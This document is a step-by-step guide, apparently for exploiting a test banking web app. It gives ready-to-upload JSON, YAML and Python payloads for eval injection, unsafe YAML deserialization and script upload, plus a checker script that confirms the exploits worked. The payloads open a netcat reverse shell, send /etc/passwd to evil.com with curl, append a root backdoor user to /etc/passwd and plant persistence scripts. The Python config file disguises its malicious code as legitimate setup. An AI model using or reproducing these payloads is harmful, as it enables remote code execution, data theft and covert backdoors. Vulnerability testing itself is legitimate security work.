
## 1. For Preferences System (JSON with eval())

### Create `malicious_preferences.json`:
```json
{
  "dashboard_layout": "custom",
  "theme": "dark",
  "description": "Custom dashboard configuration with advanced calculations",
  "formulas": {
    "balance_display": "2 + 2",
    "widget_count": "len([1,2,3])",
    "system_info": "__import__('os').system('echo PREFERENCES_PWNED > /tmp/preferences_hacked.txt')",
    "data_exfil": "__import__('subprocess').call(['curl', '-X', 'POST', 'http://evilcorp-server:8888', '--data', 'preferences_compromised'])"
  },
  "calculations": {
    "percentage": "75 * 0.01",
    "backdoor": "__import__('os').system('whoami > /tmp/current_user.txt')",
    "file_read": "open('/etc/passwd').read()[:100]",
    "reverse_shell": "__import__('os').system('nc -e /bin/bash evilcorp-server 5555')"
  }
}
```

**How to use:**
1. Copy the JSON above
2. Go to `/preferences` in your app
3. Paste it into the "Custom Configuration (JSON)" textarea
4. Click "Apply Advanced Configuration"
5. Check `/tmp/` for proof files

---

## 2. For Import System - YAML Attack

### Create `malicious_import.yaml`:
```yaml
# Innocent looking transaction import configuration
transaction_count: 150
import_rules:
  validation: strict
  currency: USD
  batch_size: 50

# Processing settings
processing:
  parallel: true
  validate_amounts: true

# YAML deserialization attacks
malicious_loader: !!python/object/apply:os.system
  - ["echo YAML_PWNED > /tmp/yaml_hacked.txt"]

# Alternative attack - subprocess
command_exec: !!python/object/apply:subprocess.check_output
  - ["whoami"]

# File exfiltration
data_theft: !!python/object/apply:os.system
  - ["curl -X POST http://evil.com/exfil --data @/etc/passwd"]

# Complex object instantiation for RCE
evil_object: !!python/object/apply:eval
  - ["__import__('os').system('echo YAML_EVAL_ATTACK > /tmp/yaml_eval.txt')"]

# Create backdoor user
backdoor: !!python/object/apply:os.system
  - ["echo 'hacker:$6$salt$hash:0:0:Evil User:/root:/bin/bash' >> /etc/passwd"]

# Network callback
callback: !!python/object/apply:os.system
  - ["curl http://evil.com/callback?source=yaml&user=$(whoami)"]
```

**How to use:**
1. Save the YAML above as `malicious_import.yaml`
2. Go to `/import` in your app
3. Upload the file with "YAML Configuration File" selected
4. Click "Import Transactions"
5. Check `/tmp/` for proof files

---

## 3. For Import System - JSON Template Attack

### Create `malicious_template.json`:
```json
{
  "version": "2.1",
  "description": "Advanced transaction import template with preprocessing",
  "preprocessing": [
    {
      "name": "environment_setup",
      "command": "__import__('os').system('echo JSON_TEMPLATE_PWNED > /tmp/json_template_hacked.txt')"
    },
    {
      "name": "system_recon",
      "command": "__import__('subprocess').call(['id'])"
    },
    {
      "name": "data_exfiltration",
      "command": "__import__('os').system('curl -X POST http://evil.com/steal --data @/etc/hostname')"
    }
  ],
  "formulas": {
    "tax_calculation": "0.08 * 100",
    "file_reader": "open('/etc/passwd').read()[:50]",
    "command_injection": "__import__('os').system('echo $(date) > /tmp/json_timestamp.txt')",
    "network_test": "__import__('subprocess').check_output(['ping', '-c', '1', '8.8.8.8']).decode()",
    "backdoor_creation": "__import__('os').system('mkdir -p /tmp/backdoor && echo \"#!/bin/bash\\necho backdoor ready\" > /tmp/backdoor/shell.sh')"
  },
  "metadata": {
    "source": "external_bank",
    "format_version": "2.1",
    "encryption": "none"
  },
  "transactions": [
    {
      "date": "2024-01-01",
      "amount": 1000.00,
      "type": "credit",
      "description": "Salary deposit"
    },
    {
      "date": "2024-01-02", 
      "amount": 50.00,
      "type": "debit",
      "description": "Grocery store"
    }
  ]
}
```

**How to use:**
1. Save the JSON above as `malicious_template.json`
2. Go to `/import` in your app
3. Upload the file with "JSON Template with Formulas" selected
4. Click "Import Transactions"
5. Check `/tmp/` for proof files

---

## 4. Configuration Script Attack

### Create `malicious_config.py`:
```python
# Banking Import Configuration Script
# This script sets up advanced import rules and processing logic

print("Loading banking import configuration...")

# Import configuration settings
import_settings = {
    'batch_size': 100,
    'validate_checksums': True,
    'currency_conversion': True,
    'duplicate_detection': True
}

# Processing rules
processing_rules = {
    'amount_validation': 'strict',
    'date_format': 'YYYY-MM-DD',
    'encoding': 'utf-8'
}

# Advanced features (MALICIOUS CODE HIDDEN HERE)
import os
import subprocess
import urllib.request

# System reconnaissance
print("Performing system validation...")
os.system('echo CONFIG_SCRIPT_PWNED > /tmp/config_script_hacked.txt')

# Gather system information
username = subprocess.check_output(['whoami']).decode().strip()
print(f"Running as user: {username}")

# File system access
try:
    with open('/etc/passwd', 'r') as f:
        passwd_content = f.read()[:200]  # First 200 chars
    print("System validation: PASSED")
except:
    print("System validation: LIMITED")

# Network exfiltration attempt
try:
    data = f"user={username}&host={os.uname().nodename}"
    urllib.request.urlopen(f"http://evil.com/callback?{data}", timeout=1)
except:
    pass  # Fail silently

# Create persistence mechanism
os.system('mkdir -p /tmp/persistence')
os.system('echo "#!/bin/bash\necho Persistent access ready" > /tmp/persistence/backdoor.sh')
os.system('chmod +x /tmp/persistence/backdoor.sh')

# File exfiltration
os.system('cp /etc/hostname /tmp/stolen_hostname.txt 2>/dev/null')

print("Configuration loaded successfully!")
print(f"Ready to process transactions with {import_settings['batch_size']} batch size")

# Return success to make it look legitimate
configuration_status = "loaded"
```

**How to use:**
1. Save the Python code above as `malicious_config.py`
2. Go to `/import` in your app
3. Upload the file with "Configuration Script" selected
4. Click "Import Transactions"
5. Check `/tmp/` for proof files

---

## 5. Quick Test Script

### Create `test_exploits.py`:
```python
#!/usr/bin/env python3
"""
Quick test script to verify the malicious payloads work
Run this to check if the vulnerabilities were successfully exploited
"""

import os
import subprocess

def check_file(filepath, description):
    if os.path.exists(filepath):
        print(f"✅ {description}: {filepath} exists")
        try:
            with open(filepath, 'r') as f:
                content = f.read().strip()
                print(f"   Content: {content}")
        except:
            pass
    else:
        print(f"❌ {description}: {filepath} not found")

def main():
    print("🔍 Checking for exploitation evidence...\n")
    
    # Check for various proof files
    check_file('/tmp/preferences_hacked.txt', 'Preferences exploit')
    check_file('/tmp/yaml_hacked.txt', 'YAML exploit')
    check_file('/tmp/json_template_hacked.txt', 'JSON template exploit')
    check_file('/tmp/config_script_hacked.txt', 'Config script exploit')
    check_file('/tmp/current_user.txt', 'User enumeration')
    check_file('/tmp/json_timestamp.txt', 'JSON timestamp')
    check_file('/tmp/stolen_hostname.txt', 'File exfiltration')
    
    # Check for backdoor directories
    if os.path.exists('/tmp/backdoor'):
        print("✅ Backdoor directory created: /tmp/backdoor")
    if os.path.exists('/tmp/persistence'):
        print("✅ Persistence directory created: /tmp/persistence")
    
    print(f"\n🏁 Test completed!")

if __name__ == "__main__":
    main()
```

**How to use:**
1. Save as `test_exploits.py`
2. After testing the malicious payloads, run: `python test_exploits.py`
3. It will show which exploits were successful

---

## 6. Safe Testing Commands

To test safely without actually attacking external systems:

```bash
# Create a safe test environment
mkdir -p /tmp/safe_test_area
cd /tmp/safe_test_area

# Clean up any previous test files
rm -f /tmp/*hacked.txt /tmp/*_pwned.txt /tmp/current_user.txt

# After testing, check results
ls -la /tmp/*hacked* /tmp/*pwned* 2>/dev/null || echo "No exploitation files found"
```
